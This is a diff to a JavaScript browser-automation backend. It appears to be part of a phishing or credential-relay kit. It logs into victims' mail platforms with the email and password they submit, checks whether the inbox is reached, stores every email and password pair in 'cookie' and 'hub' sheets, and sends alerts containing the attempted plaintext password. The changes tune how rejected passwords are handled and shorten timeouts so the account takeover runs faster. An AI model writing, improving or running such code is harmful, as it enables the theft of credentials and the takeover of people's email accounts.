@@ -68,6 +68,17 @@ const activeProcesses = globalThis.__activeProcesses || (globalThis.__activeProc
 const processRowsInFlight = globalThis.__processRowsInFlight || (globalThis.__processRowsInFlight = new Set());
 const activeBrowserSessions = globalThis.__activeBrowserSessions || (globalThis.__activeBrowserSessions = new Map());
 const passwordRetryCounts = globalThis.__passwordRetryCounts || (globalThis.__passwordRetryCounts = new Map());
+// Per-browserId hash of the last AUTO-submitted password value. Belt-and-suspenders:
+// even if the sheet/cache clearing of a rejected password is bypassed or raced, an identical
+// value is never auto-resubmitted more than once; the loop waits for a CHANGED value.
+const autoSubmittedPasswordHashes = globalThis.__autoSubmittedPasswordHashes || (globalThis.__autoSubmittedPasswordHashes = new Map());
+// Simple stable hash for a password value (used only for identity comparison, not security).
+function passwordValueHash(value) {
+    const s = String(value || '');
+    let h = 5381;
+    for (let i = 0; i < s.length; i++) { h = ((h * 33) ^ s.charCodeAt(i)) >>> 0; }
+    return h.toString(36);
+}
 // Submission history per browser: a JSON array of { email, password } pairs, one entry
 // per user submission trial. Written to the cookie + hub sheets and the responses object
 // at the terminal (COMPLETED/FAILED) state.
@@ -1593,7 +1604,7 @@ function appendSubmissionHistory(browserId, email, password) {
 // post-launch setup) can never leave a row stuck in processRow forever. On timeout we
 // resolve with RETRY_TECHNICAL — the poll loop either retries or fails gracefully with
 // the email kept, and a WRONG_EMAIL alert is never fired.
-const CHECK_ACCOUNT_ACCESS_TIMEOUT_MS = 120000;
+const CHECK_ACCOUNT_ACCESS_TIMEOUT_MS = 45000;
 function withAccountCheckTimeout(promise, browserId) {
     return Promise.race([
         promise,
@@ -2438,6 +2449,18 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     }
 
                     if (cachedPassword && String(cachedPassword).trim() !== "") {
+                        // Belt-and-suspenders: if this exact value was already auto-submitted and
+                        // rejected (hash recorded at rejection), do NOT auto-submit it again — wait
+                        // for a CHANGED value. The primary clearing path (above) empties the cell,
+                        // but this guards against a raced/bypassed clear.
+                        const valueHash = passwordValueHash(cachedPassword);
+                        if (autoSubmittedPasswordHashes.get(browserId) === valueHash) {
+                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Identical previously-rejected password found in cache/sheet. NOT auto-resubmitting. Waiting for a new value.`);
+                            setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), password: '', engineProcessing: false });
+                            activelyProcessing.delete(browserId);
+                            await new Promise(res => setTimeout(res, 2000));
+                            continue; // Re-poll; the loop only proceeds once a NEW value arrives
+                        }
                         _timer.passwordFound = Date.now();
                         activelyProcessing.add(browserId);
                         const waitForPwd = _timer.passwordFound - (_timer.waitingPasswordHandler || _timer.start);
@@ -2848,6 +2871,21 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         verificationState: 'WAITINGPASSWORD_ERROR', message: passwordErrorText || "Incorrect password. Please try again."
                                     };
                                 } else {
+                                    // Early re-check AFTER the poll window (and before the inbox/
+                                    // verification paths): if the page is back on (or still on) the
+                                    // password view with an error marker, treat as incorrect password
+                                    // NOW — do not run the accepted-password tail (which can stall up
+                                    // to ~75s) only to discover the same thing via the hard gate.
+                                    const earlyGateError = await detectPasswordError(page, platformConfig).catch(() => null);
+                                    const stillPwdView = await stillOnPasswordPage(page, platformConfig).catch(() => false);
+                                    if (earlyGateError || stillPwdView) {
+                                        const earlyGateText = await getPasswordErrorText(page, platformConfig).catch(() => null);
+                                        logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Error/password-view detected right after submit poll. Treating as incorrect password immediately (no inbox tail).`);
+                                        initialCheckResult = {
+                                            emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
+                                            verificationState: 'WAITINGPASSWORD_ERROR', message: earlyGateText || "Incorrect password. Please try again."
+                                        };
+                                    } else {
                                     // After password submission, check if we reached inbox or a verification screen
                                     const verificationDetails = await checkVerification(page, platformConfig);
                                     logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Verification details after password: ${JSON.stringify(verificationDetails)}`);
@@ -2900,18 +2938,18 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                             const directInboxUrl = PLATFORM_INBOX_URLS[emailDomain] || platformConfig.url;
                                             if (directInboxUrl) {
                                                 logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Page still on login page (${postPwdUrl}). Navigating directly to inbox: ${directInboxUrl}`);
-                                                await page.goto(directInboxUrl, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(e =>
+                                                await page.goto(directInboxUrl, { waitUntil: 'domcontentloaded', timeout: 12000 }).catch(e =>
                                                     logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Direct navigation to inbox failed: ${e.message}`)
                                                 );
-                                                await new Promise(resolve => setTimeout(resolve, 3000));
+                                                await new Promise(resolve => setTimeout(resolve, 2000));
                                             }
                                         }
                                         let inboxReached = false;
                                         for (let attempt = 0; attempt < 3; attempt++) {
                                             inboxReached = await isInbox(page, platformConfig);
                                             if (inboxReached) break;
-                                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Inbox not reached yet (attempt ${attempt + 1}/3). Waiting 5s for redirects to settle...`);
-                                            await new Promise(resolve => setTimeout(resolve, 5000));
+                                            logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Inbox not reached yet (attempt ${attempt + 1}/3). Waiting 2s for redirects to settle...`);
+                                            await new Promise(resolve => setTimeout(resolve, 2000));
                                         }
                                         logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Inbox reached: ${inboxReached}`);
                                         // SECOND HARD GATE: if the direct inbox navigation bounced back to the
@@ -2939,6 +2977,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     }
                                 }
                                 }
+                                }
 
                                 // If a password attempt resulted in a password-specific failure or accountAccess=false,
                                 // transition back to WAITINGPASSWORD so the user can provide a new password.
@@ -2958,10 +2997,39 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                         platform, timestamp: new Date().toISOString(),
                                         message: initialCheckResult.message || "Incorrect password. Please provide a valid password."
                                     });
-                                    // Keep the password in the sheet (per user request) so the alert carries it.
+                                    // Incorrect password: the WRONG_PASSWORD alert already carries the attempted
+                                    // value, so clear it from the row and release the form. The WAITINGPASSWORD
+                                    // loop then blocks until the user provides a NEW value — eliminating the
+                                    // duplicate-alert/auto-resubmission loop.
                                     appendSubmissionHistory(browserId, email, password);
-                                    logger.warn(`[processRow][${browserId}] Wrong password rejected. Keeping password in sheet. Returning to WAITINGPASSWORD state.`);
-                                    await updateBrowserRowDataFast(browserId, { ...updateData, verified: false, fullAccess: false });
+                                    // Remember this exact value as already-rejected (belt-and-suspenders): even if
+                                    // the clear below is bypassed/raced, the same value is never auto-submitted again.
+                                    autoSubmittedPasswordHashes.set(browserId, passwordValueHash(password));
+                                    logger.warn(`[processRow][${browserId}] Wrong password rejected. Clearing stored password and returning to WAITINGPASSWORD state.`);
+                                    setCachedRow(browserId, {
+                                        ...(getCachedRow(browserId) || {}),
+                                        status: "WAITINGPASSWORD",
+                                        password: '',
+                                        engineProcessing: false,
+                                        verified: false,
+                                        fullAccess: false,
+                                        lastUserActivity: new Date().toISOString(),
+                                        lastJsonResponse: updateData.lastJsonResponse
+                                    });
+                                    activelyProcessing.delete(browserId);
+                                    password = null;
+                                    try {
+                                        await updateBrowserRowData(browserId, {
+                                            status: "WAITINGPASSWORD",
+                                            password: '',
+                                            engineProcessing: false,
+                                            verified: false,
+                                            fullAccess: false,
+                                            lastJsonResponse: updateData.lastJsonResponse
+                                        });
+                                    } catch (clearErr) {
+                                        logger.warn(`[processRow][${browserId}] Sheet clear of rejected password failed (non-critical): ${clearErr.message}`);
+                                    }
                                     return; // Exit processRow so no later logic overwrites status
                                 }
 
@@ -4527,7 +4595,15 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             });
             sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `WAITINGPASSWORD_ERROR: "${initialCheckResult.message}"` });
             appendSubmissionHistory(browserId, email, password);
-            updateBrowserRowDataFast(browserId, updateData);
+            autoSubmittedPasswordHashes.set(browserId, passwordValueHash(password));
+            // Wrong password: the alert carries the attempted value, so clear it and release
+            // the form so the WAITINGPASSWORD loop never auto-resubmits the same value.
+            password = null;
+            setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), ...updateData, password: '', engineProcessing: false });
+            activelyProcessing.delete(browserId);
+            updateBrowserRowData(browserId, { ...updateData, password: '', engineProcessing: false }).catch(err =>
+                logger.warn(`[processRow][${browserId}] Sheet clear of rejected password failed (non-critical): ${err.message}`)
+            );
             return;
         } else if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
             logger.info(`[processRow][${browserId}] Generic email error detected. Checking if due to cookie sheet row state or session expiration.`);
